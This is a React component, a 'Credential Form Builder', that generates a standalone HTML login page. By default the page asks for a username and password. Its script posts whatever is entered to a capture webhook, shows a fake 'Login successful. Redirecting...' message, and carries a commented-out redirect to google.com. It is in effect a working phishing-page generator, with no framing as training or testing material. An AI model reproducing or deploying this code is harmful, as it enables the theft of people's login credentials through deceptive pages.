
'use client';

import { useState } from 'react';
import { useForm, useFieldArray } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Clipboard, Code, PlusCircle, Trash2, Eye, FileText, Settings } from 'lucide-react';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
import { Separator } from './ui/separator';

const fieldSchema = z.object({
  name: z.string().min(1, 'Field name is required.'),
  label: z.string().min(1, 'Label is required.'),
  type: z.enum(['text', 'password', 'email']),
  placeholder: z.string().optional(),
});

const formSchema = z.object({
  title: z.string().min(1, 'Title is required.'),
  description: z.string().optional(),
  buttonText: z.string().min(1, 'Button text is required.'),
  fields: z.array(fieldSchema).min(1, 'At least one field is required.'),
});

const generateFormHtml = (values: z.infer<typeof formSchema>, webhookUrl: string) => `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${values.title}</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">
    <div class="w-full max-w-md p-8 space-y-6 bg-white rounded-lg shadow-md">
        <div class="text-center">
            <h1 class="text-3xl font-bold">${values.title}</h1>
            ${values.description ? `<p class="text-gray-500">${values.description}</p>` : ''}
        </div>
        <form id="captureForm" class="space-y-4">
            ${values.fields.map(field => `
            <div>
                <label for="${field.name}" class="text-sm font-medium text-gray-700">${field.label}</label>
                <input type="${field.type}" id="${field.name}" name="${field.name}" placeholder="${field.placeholder || ''}" required
                       class="w-full px-3 py-2 mt-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500">
            </div>
            `).join('')}
            <button type="submit" class="w-full px-4 py-2 font-medium text-white bg-indigo-600 rounded-md hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500">
                ${values.buttonText}
            </button>
        </form>
    </div>
    <script>
        document.getElementById('captureForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const form = e.target;
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());
            
            try {
                const response = await fetch('${webhookUrl}', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                // Optional: redirect or show success message after capture
                form.innerHTML = '<p class="text-center text-green-500">Login successful. Redirecting...</p>';
                // window.location.href = 'https://google.com'; // Example redirect
            } catch (error) {
                console.error('Failed to send data:', error);
                form.innerHTML = '<p class="text-center text-red-500">An error occurred. Please try again.</p>';
            }
        });
    </script>
</body>
</html>
`;


export function FormBuilder() {
  const [generatedHtml, setGeneratedHtml] = useState<string | null>(null);
  const [webhookUrl, setWebhookUrl] = useState('');
  const { toast } = useToast();
  
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      title: 'Secure Login',
      description: 'Please enter your credentials.',
      buttonText: 'Sign In',
      fields: [
        { name: 'username', label: 'Username', type: 'text', placeholder: 'Enter your username' },
        { name: 'password', label: 'Password', type: 'password', placeholder: 'Enter your password' },
      ],
    },
  });

  const { fields, append, remove } = useFieldArray({
    control: form.control,
    name: "fields",
  });
  
  useState(() => {
    if (typeof window !== 'undefined') {
      setWebhookUrl(`${window.location.origin}/api/capture`);
    }
  });

  function onSubmit(values: z.infer<typeof formSchema>) {
    const html = generateFormHtml(values, webhookUrl);
    setGeneratedHtml(html);
    toast({ title: 'HTML Generated', description: 'Form HTML is ready to be copied or previewed.' });
  }

  const handleCopy = () => {
    if (generatedHtml) {
      navigator.clipboard.writeText(generatedHtml);
      toast({ title: 'Copied!', description: 'HTML code copied to clipboard.' });
    }
  };
  
  const openPreview = () => {
    if (generatedHtml) {
        const previewWindow = window.open();
        previewWindow?.document.write(generatedHtml);
        previewWindow?.document.close();
    }
  };

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-3">
          <FileText className="h-6 w-6" />
          <CardTitle>Credential Form Builder</CardTitle>
        </div>
        <CardDescription>
          Dynamically build and generate HTML for a credential capture form.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="grid md:grid-cols-2 gap-8">
            <div className="space-y-4">
                <Card className="bg-primary/10 p-4">
                  <div className="flex items-center gap-3 mb-2">
                    <Settings className="h-5 w-5"/>
                    <h3 className="text-lg font-semibold">Form Configuration</h3>
                  </div>
                  <Separator className="mb-4" />
                  <div className="space-y-4">
                    <FormField control={form.control} name="title" render={({ field }) => (<FormItem><FormLabel>Title</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem>)} />
                    <FormField control={form.control} name="description" render={({ field }) => (<FormItem><FormLabel>Description</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem>)} />
                    <FormField control={form.control} name="buttonText" render={({ field }) => (<FormItem><FormLabel>Button Text</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem>)} />
                  </div>
                </Card>
                <Card className="bg-primary/10 p-4">
                   <div className="flex items-center gap-3 mb-2">
                    <h3 className="text-lg font-semibold">Form Fields</h3>
                   </div>
                   <Separator className="mb-4" />
                   <div className="space-y-4 max-h-60 overflow-y-auto pr-2">
                    {fields.map((field, index) => (
                      <div key={field.id} className="p-3 border rounded-md relative space-y-2">
                         <div className="grid grid-cols-2 gap-2">
                           <FormField control={form.control} name={`fields.${index}.name`} render={({ field }) => ( <FormItem><FormLabel>Field Name</FormLabel><FormControl><Input placeholder="e.g., username" {...field} className="font-mono" /></FormControl><FormMessage /></FormItem> )}/>
                           <FormField control={form.control} name={`fields.${index}.label`} render={({ field }) => ( <FormItem><FormLabel>Field Label</FormLabel><FormControl><Input placeholder="e.g., Username" {...field} /></FormControl><FormMessage /></FormItem> )}/>
                         </div>
                         <div className="grid grid-cols-2 gap-2">
                           <FormField control={form.control} name={`fields.${index}.type`} render={({ field }) => ( <FormItem><FormLabel>Field Type</FormLabel><Select onValueChange={field.onChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent><SelectItem value="text">Text</SelectItem><SelectItem value="password">Password</SelectItem><SelectItem value="email">Email</SelectItem></SelectContent></Select><FormMessage /></FormItem> )}/>
                           <FormField control={form.control} name={`fields.${index}.placeholder`} render={({ field }) => ( <FormItem><FormLabel>Placeholder</FormLabel><FormControl><Input placeholder="Optional" {...field} /></FormControl><FormMessage /></FormItem> )}/>
                         </div>
                         <Button type="button" variant="ghost" size="icon" className="absolute top-0 right-0 h-7 w-7" onClick={() => remove(index)}><Trash2 className="h-4 w-4 text-destructive" /></Button>
                      </div>
                    ))}
                    </div>
                    <Button type="button" variant="outline" size="sm" className="mt-2" onClick={() => append({ name: '', label: '', type: 'text', placeholder: '' })}><PlusCircle className="mr-2 h-4 w-4" /> Add Field</Button>
                </Card>
                {form.formState.errors.fields && <FormMessage>{form.formState.errors.fields.message}</FormMessage>}
            </div>
            
            <div className="space-y-4">
               <div className="space-y-2">
                  <Label>Generated HTML</Label>
                  <Textarea readOnly value={generatedHtml || "Click 'Generate Code' to see the HTML output."} className="font-mono h-96 bg-primary/20" />
               </div>
               <div className="grid grid-cols-3 gap-2">
                  <Button type="submit"><Code className="mr-2 h-4 w-4" />Generate Code</Button>
                  <Button type="button" variant="secondary" disabled={!generatedHtml} onClick={handleCopy}><Clipboard className="mr-2 h-4 w-4" />Copy Code</Button>
                  <Button type="button" variant="secondary" disabled={!generatedHtml} onClick={openPreview}><Eye className="mr-2 h-4 w-4" />Preview</Button>
               </div>
               <Card className="mt-4">
                    <CardHeader className="p-3">
                        <CardTitle className="text-base">Webhook Endpoint</CardTitle>
                    </CardHeader>
                    <CardContent className="p-3 pt-0">
                        <Input readOnly value={webhookUrl} className="font-mono text-xs" />
                        <CardDescription className="text-xs mt-2">Captured data will be sent to this endpoint. You can monitor it in your server console.</CardDescription>
                    </CardContent>
                </Card>
            </div>
          </form>
        </Form>
      </CardContent>
    </Card>
  );
}
